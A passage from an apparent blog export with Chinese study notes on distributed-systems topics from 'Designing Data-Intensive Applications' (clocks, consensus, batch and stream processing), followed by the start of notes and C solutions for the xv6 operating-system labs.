(不會知道對面發生什麼事導致lost)\n\n請求可能已經丟失\n請求可能正在排隊，稍後將交付\n遠程節點可能已經失效\n遠程節點可能暫時停止了響應 (進程暫停)\n遠程節點可能已經處理了請求，但是網絡上的響應已經丟失\n遠程節點可能已經處理了請求，但是響應已經被延遲，並且稍後將被傳遞\n\n\n網路特性\n\n不確定: 網絡擁塞和排隊\n不可靠: 掉包\n都是為了讓網路利用最大化\n\n對比: 電信網路\n\n一次占用一個線路\n線路速度固定 (在空閒時不能多用!!)\n\n\n\n\n\n\n緩和的方法\n\n檢測故障 (把遠程節點關閉)\n\n特定的方法\n\n如果節點進程崩潰（或被管理員殺死），但節點的操作系統仍在運行，則腳本可以通知其他節點有關該崩潰的信息\n如果你有權訪問數據中心網絡交換機的管理界面，則可以通過它們檢測硬件級別的鏈路故障\n\n\ngeneral\n\n重複送、timeout (但sender還是不知道發生什麼了)\n\ntimout要多久?\n\ntimeout短: 可能把正在跑的殺了 (之後可能cascade)\ntimeout長: 效能\n用algo根據response time去動態調\n\n\n\n\n\n\n\n\n\n\n\n\n不可靠的時鐘\n\n我們想透過時間知道\n\n持續時間\n\n單調鐘 (物理時鐘)\n\n保證總是往前走的事實\n在多顆cpu下，OS會試著保證單調鐘的性質\n\n但還是保持懷疑的態度比較好\n\n\n\n\n\n\n時間點\n\n日歷時鐘 (物理時鐘)\n\nNTP同步有誤差，可能會回跳\n\n\n邏輯時鐘（logic clock）\n\n用計數器遞增\n\n\n\n\n\n\n時鐘讀數存在置信區間\n\n因為誤差\n這樣能用物理時鐘作快照隔離transaction的id嗎?\n\ngoogle Spanner\n\n要確保小的時鐘不確定性\ncommit之前等一段時間 (置信區間)\n\n\n\n\n\n\n進程暫停\n\n自己看到的東西與別人認為的不同\n因進程暫停導致自己以為\n\n我還是leader\n我的timer還沒到期 (像lease到期)\n\n\n進程暫停的可能原因\n\npreempt process\nGC\npage fault導致的IO\nIO\nvm suspend\n\n\n注意\n\n分布式系統中的節點，必須假定其執行可能在任意時刻暫停相當長的時間，即使是在一個函數的中間\n\n\n可能的努力\n\nhard real-time: 需要OS與各種程式的保證\n限制垃圾收集\n\n將GC暫停視為一個節點的短暫計劃中斷，並在這個節點收集其垃圾的同時，讓其他節點處理來自客戶端的請求\n只用垃圾收集器來處理短命對象，並定期在積累大量長壽對象（因此需要完整GC）之前重新啟動進程\n\n\n防護令牌（fencing token）\n\n這個數字在每次授予鎖(lease)定時都會增加\n然後，我們可以要求客戶端每次向存儲服務發送寫入請求時，都必須包含當前的防護令牌\n\n\n\n\n\n\n\n\n知識、真相與謊言\n\n節點不一定能相信自己對於情況的判斷\nnode可能突然智障\n\n在航空航天環境中，計算機內存或CPU寄存器中的數據可能被輻射破壞，導致其以任意不可預知的方式響應其他節點\n有不信任的點\n\n\n解\n\n法定人數，即在節點之間進行投票\n防止“撒謊”弱形式的機制\n\n對輸入檢查\n\nCRC\nescape\n\n\n\n\n\n\n\n\n算法的正確性\n\n如果某些假設爆了，最少有哪些特性要保持?\n\n安全（safety）屬性\n\n沒有壞事發生\n如果安全屬性被違反，我們可以指向一個特定的安全屬性被破壞的時間點\n\n\n活性（liveness）屬性\n\n最終好事發生\n在某個時間點，它可能不成立，但總是希望在未來能成立\n\n\n在系統模型的所有可能情況下，要求始終保持安全屬性是常見的\n對於活性屬性，我們可以提出一些注意事項\n\n\n\n\n系統模型與現實\n\n時序假設\n\n同步模型（synchronous model）\n\n假設網絡延遲、進程暫停和和時鐘誤差都是受限的\n網絡延遲、暫停和時鐘漂移將永遠不會超過某個固定的上限\n\n\n部分同步（partial synchronous）\n\n一個系統在大多數情況下像一個同步系統一樣運行，但有時候會超出網絡延遲，進程暫停和時鐘漂移的界限\n\n\n異步模型\n\n一個算法不允許對時序做任何假設——事實上它甚至沒有時鐘（所以它不能使用超時）\n\n\n\n\n節點失效\n\n崩潰停止（crash-stop）\n\n算法可能會假設一個節點只能以一種方式失效，即通過崩潰\n\n\n崩潰-恢覆（crash-recovery）\n\n我們假設節點可能會在任何時候崩潰，但也許會在未知的時間之後再次開始響應\n\n\n拜占庭（任意）故障\n\n節點可以做（絕對意義上的）任何事情，包括試圖戲弄和欺騙其他節點\n\n\n\n\n將系統模型映射到現實世界\n\n算法的理論描述可以簡單宣稱一些事是不會發生的\n\n在非拜占庭式系統中，我們確實需要對可能發生和不可能發生的故障做出假設\n\n\n真實世界的實現，仍然會包括處理“假設上不可能”情況的代碼\n\nprintf(“Sucks to be you”)和exit(666)\n\n\n\n\n\n\n\n第九章：一致性與共識\n構建容錯系統的最好方法，是找到一些帶有實用保證的通用抽象，實現一次，然後讓應用依賴這些保證\n通過使用事務，應用可以假裝沒有崩潰（原子性），沒有其他人同時訪問數據庫（隔離），存儲設備是完全可靠的（持久性）\n分布式系統最重要的抽象之一就是共識（consensus）：就是讓所有的節點對某件事達成一致\n在與只提供弱保證的數據庫打交道時，你需要始終意識到它的局限性，而不是意外地作出太多假設\n在與只提供弱保證的數據庫打交道時，你需要始終意識到它的局限性，而不是意外地作出太多假設\n盡管兩者有一部分內容重疊，但它們大多是無關的問題：事務隔離主要是為了避免由於同時執行事務而導致的競爭狀態，而分布式一致性主要關於在面對延遲和故障時如何協調副本間的狀態\n\n\n線性一致性（linearizability）\n\n讓一個系統看起來好像只有一個數據副本，而且所有的操作都是原子性的\n\n線性一致性是一個新鮮度保證（recency guarantee）\n\n\n在一個線性一致的系統中，我們可以想象，在 x 的值從0 自動翻轉到 1 的時候（在寫操作的開始和結束之間）必定有一個時間點\n\ncas成功的時候\n\n\n線性一致性與可串行化\n\n可串行化（Serializability）\n\n事務的隔離屬性\n它確保事務的行為，與它們按照某種順序依次執行的結果相同\n\n\n線性一致性（Linearizability）\n\n讀取和寫入寄存器（單個對象）的新鮮度保證\n它不會將操作組合為事務，因此它也不會阻止寫入偏差等問題\n\n\n可串行 imply 線性一致?\n\n基於兩階段鎖定的可串行化實現或真的串行執行通常是線性一致性的\n可串行化的快照隔離不是線性一致性的\n\n它從一致的快照中進行讀取，以避免讀者和寫者之間的鎖競爭\n一致性快照的要點就在於它不會包括該快照之後的寫入，因此從快照讀取不是線性一致性的。\n\n\n\n\n\n\nscnerio\n\n鎖定和領導選舉\n約束和唯一性保證\n跨信道的時序依賴\n\n\n實現線性一致的系統 (副本)\n\n單主覆制\n\n可能線性一致\n\n一個節點很可能會認為它是領導者，而事實上並非如此\n\n\n\n\n共識算法\n\n線性一致\n\n防止腦裂和陳舊副本的措施\n\n\n\n\n多主覆制\n\n非線性一致\n\nLWW與沒有固定資料來源\n\n\n\n\n無主覆制\n\n也許不是線性一致的\n\n有網路延遲就會讓write變慢，這樣就有可能讀到舊的\n\n做讀修復就可以保持線性一致 (client看到新的就寫回去舊的source)\n\n只能實現線性一致的讀寫\n不能實現線性一致的比較和設置（CAS）操作\n\n因為它需要一個共識算法\n\n\n\n\n\n\n寬松的法定人數\n\n\n\n\n\n\n線性一致性的代價\n\n網絡中斷迫使在線性一致性和可用性之間做出選擇\n為了提高性能而選擇了犧牲線性一致性，而不是為了容錯\n\n如果你想要線性一致性，讀寫請求的響應時間至少與網絡延遲的不確定性成正比\n\n\n\n\n\n\n\n順序保證\n\n順序反覆出現有幾個原因，其中一個原因是，它有助於保持因果關系（causality）\n因果一致（causally consistent）\n\n一個系統服從因果關系所規定的順序\n\n快照隔離提供了因果一致性：當你從數據庫中讀取到一些數據時，你一定還能夠看到其因果前驅\n\n\n因果順序不是全序的 (有併發的事件所以沒有全序)\n\n線性一致性強於因果一致性\n\n線性一致性\n\n在線性一致的系統中，操作是全序的 (表現的就好像只有一個數據副本)\n\n\n因果性\n\n兩個事件是因果相關的（一個發生在另一個事件之前），則它們之間是有序的\n它們是並發的，則它們之間的順序是無法比較的\n\n\n線性一致性隱含著（implies） 因果關系\n\n許多情況下，看上去需要線性一致性的系統，實際上需要的只是因果一致性，因果一致性可以更高效地實現\n\n\n\n\n\n\n捕獲因果關系\n\n為了確定因果依賴，我們需要一些方法來描述系統中節點的“知識”\n\n如果節點在發出寫入Y 的請求時已經看到了 X的值，則 X 和 Y 可能存在因果關系\n在檢測並發寫入時看到的版本向量\n\n是檢測到對同一個鍵的並發寫入\n所以需要一個更高維的版本來跟蹤整個數據庫中的因果依賴\n\n\n\n\n\n\n\n\n序列號順序\n\n雖然因果是一個重要的理論概念，但實際上跟蹤所有的因果關系是不切實際的\n\n改用序列號順序\n\n使用序列號（sequence nunber） 或時間戳（timestamp） 來排序事件\n\n\n\n\n每個操作都有一個唯一的序列號，而且總是可以比較兩個序列號，確定哪一個更大\n\n與因果一致（consistent with causality） 的全序\n\n並行操作之間可以任意排序。這樣一個全序關系捕獲了所有關於因果的信息，但也施加了一個比因果性要求更為嚴格的順序\n\n\n蘭伯特時間戳 (Lamport)\n\n蘭伯特時間戳就是兩者的簡單組合：（計數器，節點ID）\n蘭伯特時間戳與物理的日歷時鐘沒有任何關系，但是它提供了一個全序：如果你有兩個時間戳，則計數器值大者是更大的時間戳\n作法\n\n每個節點和每個客戶端跟蹤迄今為止所見到的最大計數器值，並在每個請求中包含這個最大計數器值\n當一個節點收到最大計數器值大於自身計數器值的請求或響應時，它立即將自己的計數器設置為這個最大值。\n\n\n蘭伯特時間戳 &amp; 版本向量\n\n版本向量可以區分兩個操作是並發的，還是一個因果依賴另一個\n蘭伯特時間戳總是施行一個全序\n\n無法分辨兩個操作是並發的還是因果依賴的\n\n\n\n\n光有時間戳排序還不夠\n\n只有在所有的操作都被收集之後，操作的全序才會出現 (當下不會知道)\n\n為了實現諸如用戶名上的唯一約束這種東西\n\n僅有操作的全序是不夠的\n你還需要知道這個全序何時會塵埃落定\n\n全序廣播\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n全序廣播\n\n順序在消息送達時被固化\n\n如果後續的消息已經送達，節點就不允許追溯地將（先前）消息插入順序中的較早位置\n這個事實使得全序廣播比時間戳排序更強\n\n\n要滿足兩個安全屬性\n\n可靠交付（reliable delivery）\n\n沒有消息丟失：如果消息被傳遞到一個節點，它將被傳遞到所有節點\n\n\n全序交付（totally ordered delivery）\n\n消息以相同的順序傳遞給每個節點\n\n\n\n\n消息被保證以固定的順序可靠地傳送，但是不能保證消息何時被送達\n可以使用全序廣播來實現可串行化的事務\n\n每個消息都代表一次數據庫的寫入，且每個副本都按相同的順序處理相同的寫入\n\n那麽副本間將相互保持一致（除了臨時的覆制延遲）\n\n這個原理被稱為狀態機覆制\n\n\n\n\n\n\n使用全序廣播實現線性一致的存儲\n\n從形式上講，線性一致讀寫寄存器是一個“更容易”的問題\n\n全序廣播等價於共識\n共識問題在異步的崩潰-停止模型中沒有確定性的解決方案\n\n線性一致的讀寫寄存器可以在這種模型中實現\n\n\n\n\n支持諸如比較並設置（CAS, compare-and-set），或自增並返回（increment-and-get） 的原子操作使線性一致等價於共識問題\n作法\n\n寫入線性一致\n\n在log加消息claim要加資料\n讀日志，並等待你剛才追加的消息被讀回\n如果第一筆是你的req就可以commit，不然就abort\n\n\n讀取線性一致\n\n在log加消息claim要讀資料\n讀日志，並等待你剛才追加的消息被讀回，有了就去讀\n\n\n\n\n\n\n使用線性一致性存儲實現全序廣播\n\n作法\n\n每個要通過全序廣播發送的消息首先對線性一致寄存器執行自增並返回操作\n\n你對線性一致性的序列號生成器進行過足夠深入的思考，你不可避免地會得出一個共識算法\n\n\n然後將從寄存器獲得的值作為序列號附加到消息中\n然後你可以將消息發送到所有節點（重新發送任何丟失的消息），而收件人將按序列號依序傳遞（deliver）消息\n\n\n\n\n\n\n\n分布式事務與共識\n\n場景\n\n領導選舉\n原子提交\n\n\n兩階段提交（two-phase commit）\n\n用於實現跨多個節點的原子事務提交的算法，即確保所有節點提交或所有節點中止\n\n當應用準備提交時，協調者開始階段 1 ：它發送一個準備（prepare） 請求到每個節點，詢問它們是否能夠提交\n如果所有參與者都回答“是”，表示它們已經準備好提交，那麽協調者在階段 2 發出提交（commit） 請求\n\n\n兩個關鍵的“不歸路”點\n\n當參與者投票“是”時，它承諾它稍後肯定能夠提交\n一旦協調者做出決定，這一決定是不可撤銷的\n\n\n協調者失效\n\n只能等待協調者自己好\n讓管理員手動決定提交還是回滾事務\n\n\n關心存疑事務？\n\n數據庫事務通常獲取待修改的行上的行級排他鎖，以防止臟寫\n\n\n\n\n\n\n\n容錯共識\n\n特點\n\n一致同意（Uniform agreement）: 沒有兩個節點的決定不同。\n完整性（Integrity）: 沒有節點決定兩次。\n有效性（Validity）: 如果一個節點決定了值 v ，則 v 由某個節點所提議\n終止（Termination）: 由所有未崩潰的節點來最終決定值。\n\n\n方法\n\n如果你不關心容錯，那麽滿足前三個屬性很容易：你可以將一個節點硬編碼為“獨裁者”，並讓該節點做出所有的決定\n\n它實質上說的是，一個共識算法不能簡單地永遠閑坐著等死\n\n\n\n\n全序廣播相當於重覆進行多輪共識\n限制\n\n共識系統總是需要嚴格多數來運轉\n大多數共識算法假定參與投票的節點是固定的集合\n共識系統通常依靠超時來檢測失效的節點\n\n\n\n\n\n第十章：批處理\n使用MapReduce編程模型，能將計算的物理網絡通信層面（從正確的機器獲取數據）從應用邏輯中剝離出來（獲取數據後執行處理）\n\nMapReduce作業執行\n\n讀folder\n\nhadoop: 將計算放在數據附近 (copy code過去)\nDB: 把資料拉回來\n\n\nmap: 分類(加上key)\n\nMap任務的數量由輸入文件塊的數量決定\n\n\nreduce: 根據key做運算 &amp; 合併 &amp; sort!!\n\nReducer的任務的數量是由作業作者配置\n\n\n放到folder\n\n\nMapReduce工作流\n\n一個作業的輸出成為下一個作業的輸入\n\n通過目錄名隱式實現\n\n會產生臨時文件 (物化臨時狀態)\n\n之後被copy到其他node!!\n\n所以之後有spark把整個workflow當成一個task的框架\n同時所有資料都在mem\n\n\n這樣retry很容易\n\n因為資料是持久化的\n\n\n\n\n\n\n\n\n\n\nReduce側連接與分組 (join in reduce)\n\n排序合並連接（sort-merge join）\n\n把要join的資料先載回來，sort\n之後就可以join\n\n\n分組\n\nmapper用同一個key\n\n\nReduce側方法的\n\n優點\n\n不需要對輸入數據做任何假設：無論其屬性和結構如何，Mapper都可以對其預處理以備連接\n\n\n缺點\n\n排序，覆制至Reducer，以及合並Reducer輸入，所有這些操作可能開銷巨大\n\n\n\n\n\n\n處理偏斜\n\nreducer會變成熱點\n\n由於MapReduce作業只有在所有Mapper和Reducer都完成時才完成，所有後續作業必須等待最慢的Reducer才能啟動\n\n\n偏斜連接（skewed join）\n\n首先運行一個抽樣作業（Sampling Job）來確定哪些鍵是熱鍵\n連接實際執行時，Mapper會將熱鍵的關聯記錄隨機（相對於傳統MapReduce基於鍵散列的確定性方法）發送到幾個Reducer之一\n對於另外一側的連接輸入，與熱鍵相關的記錄需要被覆制到所有處理該鍵的Reducer上\n\n\n\n\nMap側連接\n\n如果你能對輸入數據作出某些假設，則通過使用所謂的Map側連接來加快連接速度是可行的\n廣播散列連接（broadcast hash join）\n\n把小數據集放到map的hash table，之後join\n\n另一種方法是將較小輸入存儲在本地磁盤上的只讀索引中\n\n\n\n\n桶連接（bucketed map joins）\n\n把資料分類再跑broadcast hash join\n\nMapper3首先將所有具有以3結尾的ID的用戶加載到散列表中，然後掃描ID為3的每個用戶的所有活動事件\n\n\n\n\nMap側合並連接\n\n如果輸入數據集不僅以相同的方式進行分區，而且還基於相同的鍵進行排序\n\n在這種情況下，輸入是否小到能放入內存並不重要\n\n\n因為這時候Mapper同樣可以執行歸並操作（通常由Reducer執行）的歸並操作\n\n\n\n\n針對頻繁故障設計\n\nMapReduce可以容忍單個Map或Reduce任務的失敗，而不會影響作業的整體，通過以單個任務的粒度重試工\n它也會非常急切地將數據寫入磁盤，一方面是為了容錯，另一部分是因為假設數據集太大而不能適應內存\n\n\n\n第十一章：流處理\n為了減少延遲，我們可以更頻繁地運行處理 —— 比如說，在每秒鐘的末尾 —— 或者甚至更連續一些，完全拋開固定的時間切片，當事件發生時就立即進行處理，這就是流處理（stream processing）\n記錄通常被叫做 事件（event） ，但它本質上是一樣的：一個小的、自包含的、不可變的對象，包含某個時間點發生的某件事情的細節。一個事件通常包含一個來自日歷時鐘的時間戳，以指明事件發生的時間\n一個事件由 生產者（producer）生成一次，然後可能由多個 消費者（consumer）進行處理\n在某些系統中，網絡延遲可能低於磁盤訪問延遲，網絡帶寬也可能與磁盤帶寬相當。沒有針對所有情況的普適理想權衡，隨著存儲和網絡技術的發展，本地狀態與遠程狀態的優點也可能會互換。\n\n消息傳遞系統（messaging system）\n\n生產者發送包含事件的消息，然後將消息推送給消費者\n兩個問題\n\n如果生產者發送消息的速度比消費者能夠處理的速度快會發生什麽\n\n系統可以丟掉消息\n將消息放入緩沖隊列\n使用背壓 (有限的queue)\n\n\n如果節點崩潰或暫時脫機，會發生什麽情況？ —— 是否會有消息丟失？\n\n\n傳送方式\n\n直接從生產者傳遞給消費者\n\n它們通常要求應用代碼意識到消息丟失的可能性\n它們通常也只是假設生產者和消費者始終在線\n\n當生產者崩潰時，它可能會丟失消息緩沖區及其本應發送的消息，這種方法可能就沒用了\n\n\n\n\n消息代理\n\n消息代理實質上是一種針對處理消息流而優化的數據庫\n持久性問題則轉移到代理的身上\n消息代理與數據庫的對比\n\n刪除\n\n數據庫通常保留數據直至顯式刪除\n大多數消息代理在消息成功遞送給消費者時會自動刪除消息\n\n\n工作集\n\n由於它們很快就能刪除消息，大多數消息代理都認為它們的工作集相當小\n如果代理需要緩沖很多消息，每個消息需要更長的處理時間，整體吞吐量可能會惡化\n\n\nsearch\n\n數據庫通常支持次級索引和各種搜索數據的方式\n消息代理通常支持按照某種模式匹配主題\n\n\nquery\n\n查詢數據庫時，結果通常基於某個時間點的數據快照\n消息代理不支持任意查詢，但是當數據發生變化時，它們會通知客戶端\n\n\n\n\n\n\n\n\n消息傳遞模式\n\n負載均衡（load balancing）\n\n每條消息都被傳遞給消費者之一\n\n\n扇出（fan-out）\n\n每條消息都被傳遞給所有消費者\n\n\n\n\n確認與重新傳遞\n\n為了確保消息不會丟失，消息代理使用確認（acknowledgments）\n如果與客戶端的連接關閉，或者代理超出一段時間未收到確認，代理則認為消息沒有被處理，因此它將消息再遞送給另一個消費者。\n\n但其實有可能已經被處理完了!! (ack可能被drop)\n即使消息代理試圖保留消息的順序，負載均衡與重傳的組合也不可避免地導致消息被重新排序!!\n\n\n\n\n基於日志的消息代理（log-based message brokers）\n\n使用日志進行消息存儲\n\n生產者通過將消息追加到日志末尾來發送消息\n消費者通過依次讀取日志來接收消息\n\n\n為了伸縮超出單個磁盤所能提供的更高吞吐量\n\n可以對日志進行分區（按第六章的定義）\n不同的分區可以托管在不同的機器上\n\n使得每個分區都有一份能獨立於其他分區進行讀寫的日志\n\n\n在每個分區內，代理為每個消息分配一個單調遞增的序列號或偏移量\n\n所有偏移量小於消費者的當前偏移量的消息已經被處理，而具有更大偏移量的消息還沒有被看到\n代理不需要跟蹤確認每條消息，只需要定期記錄消費者的偏移即可\n\n\n\n\n\n日志與傳統的消息傳遞相比\n\n為了在一組消費者之間實現負載平衡\n\n代理可以將整個分區分配給消費者組中的節點\n\n而不是將單條消息分配給消費者客戶端\n\n\n\n\n每個客戶端將消費被指派分區中的所有消息\n\n共享消費主題工作的節點數，最多為該主題中的日志分區數\n如果某條消息處理緩慢，則它會阻塞該分區中後續消息的處理\n\n\n\n\n磁盤空間使用\n\n為了回收磁盤空間，日志實際上被分割成段\n\n如果一個慢消費者跟不上消息產生的速率而落後得太多\n\n它的消費偏移量指向了刪除的段，那麽它就會錯過一些消息\n\n你可以監控消費者落後日志頭部的距離，如果落後太多就發出報警。\n由於緩沖區很大，因而有足夠的時間來修覆慢消費者\n\n\n\n\n\n\n\n\n重播舊消息\n\n除了消費者的任何輸出之外，處理的唯一副作用是消費者偏移量的前進\n\n\n把DB當成message brokers\n\nredo log當成message\n\n變更數據捕獲（change data capture, CDC）\n\n紀錄底層的狀態變更\n存儲在搜索索引和數據倉庫中的數據，只是記錄系統數據的額外視圖\n\n存儲在搜索索引和數據倉庫中的數據，只是記錄系統數據的額外視圖\n\n\n變更數據捕獲通常是異步的\n添加緩慢的消費者不會過度影響記錄系統\n\n所有覆制延遲可能有的問題在這里都可能出現\n\n\n\n\n事件溯源（Event Sourcing）\n\n應用邏輯顯式構建在寫入事件日志的不可變事件之上\n\n事件通常表示用戶操作的意圖，而不是因為操作而發生的狀態更新機制\n\n所以你需要完整的歷史事件來重新構建最終狀態\n這里進行同樣的日志壓縮是不可能的\n\n\n\n\n仔細區分事件（event） 和命令（command）\n\n用戶的請求剛到達時，它一開始是一個命令\n\n可能失敗\n\n\n如果驗證成功並且命令被接受，則它變為一個持久化且不可變的事件\n\n在事件生成的時刻，它就成為了事實（fact）\n\n\n\n\n\n\n並發控制\n\n事件溯源和變更數據捕獲的最大缺點是，事件日志的消費者通常是異步的，所以可能會\n\n用戶會寫入日志，然後從日志衍生視圖中讀取，結果發現他的寫入還沒有反映在讀取視圖中\n\n\n一種解決方案是將事件追加到日志時同步執行讀取視圖的更新\n\n需要事務\n\n\n\n\n\n\n\n\n\n\n\n\n流處理\n\n特色\n\n當查詢進入時，數據庫搜索與查詢匹配的數據，然後在查詢完成時丟掉查詢\n分析往往對找出特定事件序列並不關心，而更關注大量事件上的聚合與統計指標\n構建物化視圖可能需要任意時間段內的所有事件，除了那些可能由日志壓縮丟棄的過時事件\n查詢被存儲下來，文檔從查詢中流過\n\n\n事件時間與處理時間\n\n測量請求速率，按處理時間來衡量速率\n\n如果你重新部署流處理器，它可能會停止一分鐘，並在恢覆之後處理積壓的事件\n請求速率看上去就像有一個異常的突發尖峰\n實際上請求速率是穩定的\n\n\n要統計的方式思考、而不是取樣的方式思考\n\n\n知道什麽時候準備好了\n\n你永遠也無法確定是不是已經收到了特定窗口的所有事件，還是說還有一些事件正在來的路上\n\n忽略這些滯留事件\n發布一個更正（correction），一個包括滯留事件的更新窗口值\n在某些情況下，可以使用特殊的消息來指示“從現在開始，不會有比t更早時間戳的消息了”\n\n\n\n\n你用的是誰的時鐘？\n\n事件上的事件戳實際上應當是用戶交互發生的時間，取決於移動設備的本地時鐘\n\n本地時鐘可能改過\n\n\n方法\n\n記錄三個時間戳\n\n事件發生的時間，取決於設備時鐘\n事件發送往服務器的時間，取決於設備時鐘\n事件被服務器接收的時間，取決於服務器時鐘\n\n\n通過從第三個時間戳中減去第二個時間戳，可以估算設備時鐘和服務器時鐘之間的偏移\n然後可以將該偏移應用於事件時間戳，從而估計事件實際發生的真實時間\n\n\n\n\n窗口的類型\n\n滾動窗口（Tumbling Window）\n\n滾動窗口有著固定的長度，每個事件都僅能屬於一個窗口\n\n\n跳動窗口（Hopping Window）\n\n跳動窗口也有著固定的長度，但允許窗口重疊以提供一些平滑\n\n\n滑動窗口（Sliding Window）\n\n滑動窗口包含了彼此間距在特定時長內的所有事件\n\n\n會話窗口（Session window）\n\n將同一用戶出現時間相近的所有事件分組在一起，而當用戶一段時間沒有活動時窗口結束\n\n\n\n\n\n\n不變性的局限性\n\n永遠保持所有變更的不變歷史，在多大程度上是可行的？\n\n答案取決於數據集的流失率\n\n數據集上有較高的更新/刪除率，不可變的歷史可能增至難以接受的巨大\n\n碎片化可能成為一個問題，壓縮與垃圾收集的表現對於運維的穩健性變得至關重\n\n\n\n\n\n\n不能做到真正的刪除\n\n隱私條例可能要求在用戶關閉帳戶後刪除他們的個人信息\n但副本可能存在於很多地方\n\n\n\n\n冪等性\n\n丟棄任何失敗任務的部分輸出，以便能安全地重試，而不會生效兩次\n\n分布式事務\n依賴冪等性（idempotence）\n\n\n依賴冪等性意味著隱含了一些假設\n\n重啟一個失敗的任務必須以相同的順序重播相同的消息，處理必須是確定性的，沒有其他節點能同時更新相同的值\n\n\n\n\n雙寫（dual write）的問題\n\n如果周期性的完整數據庫轉儲過於緩慢，有時會使用的替代方法是雙寫\n\n應用代碼在數據變更時明確寫入每個系統 (DB, search index…)\n\n\n雙寫有一些嚴重的問題\n\n競爭條件 (並發檢測機制: 版本向量)\n其中一個寫入可能會失敗，而另一個成功 (原子提交)\n\n\n\n\n\n\n第十二章：數據系統的未來\nskip\n","categories":["System","Distributed","Reading"]},{"title":"xv6 labs","url":"/2022/01/xv6-labs/","content":"動機\n\nWhat I can not create I do not understand.\n\n6.s081是個了解unix與c語言的超讚課程\n有許多符合自修性質\n\n有實作\n有test\n有解答可以參考\n\n這篇是我讀pdf(有人翻譯2020的pdf，所以有些句子可能看起來怪怪的)與lab的筆記\nlab是2020版，6.s081有經歷幾次改版，lab的內容會換一下，尤其是2019到2020差有點多\n\n裝環境\n我是在win11 WSL2的ubuntu 20.04跑\nsudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu gcc-riscv64-unknown-elf\n需要參考的話，我的lab code在這\n怎麼在lab使用gdb\n\n在~/.gdbinit加add-auto-load-safe-path ~/xv6-labs/.gdbinit\n跑make qemu-gdb\n在另一個視窗跑gdb-multiarch\n\n如何debug\n\n在panic打上breakpoint\n利用make產生的xxx.asm，可以用addr去對，找到哪一行出事了(addr2line -e kernel/kernel pc-value)\nqemu的Ctrl-a x是關閉，Ctrl-a c是類似gdb可以info mem看pagetable\n一點一點的寫，可以用panic去停下cpu看狀態對不對\n在沒有動過的地方掛了、一開始就動不了\n\n可能理由\n\nmem不知道寫到哪了\n\n腦袋要清楚mem到底要怎麼寫\n\n這個是va, pa, pte?\n這裡是page, stack的終點還是起點?\n資料往哪邊長?\n\nstack是高往低\n一般資料是低往高\n\n\n\n\n\n\nconcurrent沒處理好\n\ndeadlock\n\n這個去trace中間用到的function應該可以看到一些東西\n\n有人跟你用一樣的lock\n\n\n拿lock的順序對嗎\n\n\n沒有用lock包好\n\n思考有哪些資料是要一起動的，思考在lock結束後有什麼性質要有\n\nreference counter\nfreelist\n\n\n\n\n\n\n\n\n\n\n\nch1\n在riscv中，CPU == hart\nfd\n因為綁定0,1成stdin, stdout\n所以會需要close，之後再開新的file完成redirect\n因為fd是從小的開始分配\nif(fork() == 0) &#123;    close(0);    open(&quot;input.txt&quot;, O_RDONLY);    exec(&quot;cat&quot;, argv);&#125;\ndup做soft copy，所以下面的file會是hello world\nfd = dup(1);write(1, &quot;hello&quot;, 6);write(fd, &quot;world\\n&quot;, 6);\n這裡想完成的事就是dynamic scope或是Parameterize\npipe\npipe會產生一個file(in mem)，之後開2個fd，下面是redirect stdin到pipe\npipe(p);if(fork() == 0) &#123;    close(0);    dup(p[0]);    close(p[0]);    close(p[1]);    exec(&quot;/bin/wc&quot;, argv);&#125; else &#123;    write(p[1], &quot;hello world\\n&quot;, 12);    close(p[0]);    close(p[1]);&#125;\n這等於就是把ref裡面的東西暴露給user阿\n(因為綁定0,1成stdin, stdout)\ntrace: pipe\n\npipe是由兩個file控制的ring buffer\n由寫到哪(nwrite)與讀到哪(nread)控制sleep與wakeup\n\nalloc pipe\n\nsys_pipe\n\nalloc 兩個struct file\npipealloc設定兩個file\n\nkalloc一塊page，作為struct pipe\n讓file能指到struct pipe\n\n\n把fd寫回去\n\ncopyout留到pagetable那章談\n\n\n\n\n\nwrite/read syscall\n\nsys_write/sys_write\n\nfilewrite/fileread根據struct file的type跑到pipe去\n\npiperead\n\n空了 AND 對面還想要寫\n\npi-&gt;nread == pi-&gt;nwrite &amp;&amp; pi-&gt;writeopen\n先去睡覺\n\n\n開始寫到addr (increase nread)\n\n注意到這是個ring buffer!!\n\n\n都好了就wakeup對面 (用nwrite去認)\n\nsleeplock留到lock那章談\n\n\n\n\npipewrite\n\n對面不想要讀\n\nreturn\n\n\n如果\n\n滿了\n\npi-&gt;nwrite == pi-&gt;nread + PIPESIZE\nwakeup對面 (用nread去認)\n先去睡覺\n\n\n沒滿\n\n從addr讀到struct pipe中 (increase nwrite)\n\n\n\n\n\n\n\n\n\n\n\nclose syscall\n\nsys_close\n\npipeclose\n\n根據fd來看是不是用來寫的\n之後關對應的狀態\nwakeup另外一邊\n\n\n\n\n\nLab Utilities\nsleep\n練手用\n#include &quot;kernel/types.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;user/user.h&quot;intmain(int argc, char *argv[])&#123;  if (argc != 2)    fprintf(2, &quot;sleep: 2 args\\n&quot;);  sleep(atoi(argv[1]));  exit(0);&#125;\npingpong\n這裡開始寫簡單的pipe\n從前面的trace可以看出，pipe只有三個狀態下會換手\n\nread/write完成\n空了/滿了\nclose\n\n所以寫pipe時要記得把所有read/write該關的都關一關\n#include &quot;kernel/types.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;user/user.h&quot;void closeR(int *p) &#123; close(p[0]); &#125;void closeW(int *p) &#123; close(p[1]); &#125;intmain(int argc, char *argv[])&#123;  int p2c[2], c2p[2];  pipe(p2c), pipe(c2p);  if (fork()) &#123;    int tmp = 0;    closeR(p2c);    closeW(c2p);    write(p2c[1], &amp;tmp, sizeof(int));    read(c2p[0], &amp;tmp, sizeof(int));    printf(&quot;%d: received pong\\n&quot;, getpid());    closeW(p2c);    closeR(c2p);  &#125; else &#123;    int tmp = 1;    closeW(p2c);    closeR(c2p);    read(p2c[0], &amp;tmp, sizeof(int));    printf(&quot;%d: received ping\\n&quot;, getpid());    write(c2p[1], &amp;tmp, sizeof(int));    closeR(p2c);    closeW(c2p);  &#125;  exit(0);&#125;\nfind\n主要是練怎麼用file stat，以及認識到c處理string是多麼麻煩\n#include &quot;kernel/types.h&quot;#include &quot;kernel/stat.h&quot;#include &quot;user/user.h&quot;#include &quot;kernel/fs.h&quot;char* getFilename(char *path)&#123;  char *start = path;  int len = strlen(path);  path += len;  for(;path != start &amp;&amp; *path != &#x27;/&#x27;;path--) ;  if (*path == &#x27;/&#x27;)  